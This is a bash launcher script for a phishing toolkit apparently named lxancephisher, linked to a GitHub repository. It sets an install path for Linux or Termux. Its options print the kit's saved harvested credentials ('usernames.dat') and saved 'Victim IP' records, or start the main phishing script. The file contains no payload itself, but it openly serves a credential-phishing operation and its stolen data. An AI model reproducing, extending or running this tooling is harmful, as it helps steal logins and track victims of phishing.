#!/bin/bash

# https://github.com/LxaNce-Hacker/lxancephisher

if [[ $(uname -o) == *'Android'* ]];then
	LXANCEPHISHER_ROOT="/data/data/com.termux/files/usr/opt/lxancephisher"
else
	export LXANCEPHISHER_ROOT="/opt/lxancephisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run lxancephisher type \`lxancephisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $LXANCEPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $LXANCEPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $LXANCEPHISHER_ROOT
	bash ./lxancephisher.sh
fi
